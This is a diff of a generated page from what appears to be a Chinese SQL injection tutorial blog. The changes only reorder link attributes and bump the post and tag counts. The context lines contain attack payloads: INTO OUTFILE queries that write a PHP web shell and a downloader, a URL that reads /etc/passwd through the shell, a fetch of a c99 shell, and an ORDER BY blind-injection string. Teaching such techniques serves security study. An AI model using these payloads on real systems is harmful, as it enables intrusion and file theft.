@@ -753,11 +753,11 @@ information_schema
 <p>写一个php的shell：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT <span class="string">'&lt;? system($_GET[\'c\']); ?&gt;'</span> INTO OUTFILE <span class="string">'/var/www/shell.php'</span>;</div></pre></td></tr></table></figure>
 <p>访问如下链接：</p>
-<p><a href="http://localhost/shell.php?c=cat%20/etc/passwd" target="_blank" rel="external nofollow noopener noreferrer">http://localhost/shell.php?c=cat%20/etc/passwd</a></p>
+<p><a href="http://localhost/shell.php?c=cat%20/etc/passwd" rel="external nofollow noopener noreferrer" target="_blank">http://localhost/shell.php?c=cat%20/etc/passwd</a></p>
 <p>写一个下载者：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="string">'&lt;? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?&gt;'</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'/var/www/get.php'</span></div></pre></td></tr></table></figure>
 <p>访问如下链接：</p>
-<p><a href="http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt" target="_blank" rel="external nofollow noopener noreferrer">http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt</a></p>
+<p><a href="http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt" rel="external nofollow noopener noreferrer" target="_blank">http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt</a></p>
 <ul>
 <li>INTO OUTFILE 不可以覆盖已存在的文件。</li>
 <li>INTO OUTFILE 必须是最后一个查询。</li>
@@ -1202,7 +1202,7 @@ information_schema
 <p>5、接下来猜解其它表了 只需要修改 limit 1,1 -&gt; limit 2,1就可以对接下来的表进行盲注了。</p>
 <h3 id="order-by后的注入"><a href="#order-by后的注入" class="headerlink" title="order by后的注入"></a>order by后的注入</h3><p>oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。</p>
 <p>一般带有oder或者orderby的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：</p>
-<p>原始链接：<a href="http://www.test.com/list.php?order=vote" target="_blank" rel="external nofollow noopener noreferrer">http://www.test.com/list.php?order=vote</a> 根据vote字段排序。</p>
+<p>原始链接：<a href="http://www.test.com/list.php?order=vote" rel="external nofollow noopener noreferrer" target="_blank">http://www.test.com/list.php?order=vote</a> 根据vote字段排序。</p>
 <p>找到投票数最大的票数num然后构造以下链接：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.test.com/list.php?order=abs(vote-(length(user())&gt;0)*num)+asc</div></pre></td></tr></table></figure>
 <p>看排序是否变化。</p>
@@ -1338,7 +1338,7 @@ information_schema
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">157</span>
+              <span class="site-state-item-count">158</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1355,7 +1355,7 @@ information_schema
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">37</span>
+                <span class="site-state-item-count">38</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
